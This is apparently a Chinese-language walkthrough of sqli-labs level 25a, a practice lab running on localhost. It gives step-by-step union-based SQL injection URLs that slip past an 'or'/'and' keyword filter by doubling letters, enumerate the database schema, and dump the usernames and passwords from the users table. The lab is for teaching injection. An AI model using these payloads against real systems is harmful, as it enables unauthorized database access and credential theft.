sql-labs-Less-25a

进入http://127.0.0.1/sql/Less-25a/，输入?id=1,正常，在输入'，出现错误，但没有报错，说明不能用报错注入。
查看源代码得知这关没有对id进行包裹，所以是整数型注入，还把大小写的‘or’和‘and’进行了过滤。
可以用联合注入和延时注入。
这里用联合注入：
查列数：http://127.0.0.1/sql/Less-25a/?id=1 oorrder by 3–+
测位置：http://127.0.0.1/sql/Less-25a/?id=-1 union select 1,2,3–+
查库：http://127.0.0.1/sql/Less-25a/?id=-1 union select 1,database(),3–+
查表：http://127.0.0.1/sql/Less-25a/?id=-1 union select 1,(select group_concat(table_name) from infoorrmation_schema.tables where table_schema=’security’),3–+
查列：http://127.0.0.1/sql/Less-25a/?id=-1 union select 1,(select group_concat(column_name) from infoorrmation_schema.columns where table_name=’users’),3–+
查字段：http://127.0.0.1/sql/Less-25a/?id=-1 union select 1,(select group_concat(username) from users),(select group_concat(passwoorrd) from users)–+
